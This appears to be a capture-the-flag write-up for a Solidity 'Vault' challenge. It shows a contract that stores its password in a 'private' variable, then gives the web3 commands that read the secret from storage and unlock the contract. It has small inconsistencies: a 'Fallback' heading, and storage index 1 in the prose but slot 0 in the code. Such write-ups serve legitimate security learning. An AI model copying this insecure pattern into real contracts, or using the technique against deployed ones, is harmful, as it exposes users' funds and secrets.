## Fallback memes

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

</p>
</details>

### Solution

If it's decentralized, how can it ever be private! Good question. Ethereum Stack Exchanged
[has the answer to it](https://ethereum.stackexchange.com/questions/44893/how-do-i-see-the-value-of-a-string-stored-in-a-private-variable): it ain't
possible. By navigating through the storage, I found at the solution at index 1 by using the following command:
```javascript
await web3.eth.getStorageAt(instance, 0, (e, v) => console.log(web3.utils.toAscii(v)));
```

Once I had the key, I just had to call the unlock function:
```javascript
contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29') // Key is *most likely* randomized so don't bother reusing it
```

And tada. Donzo!
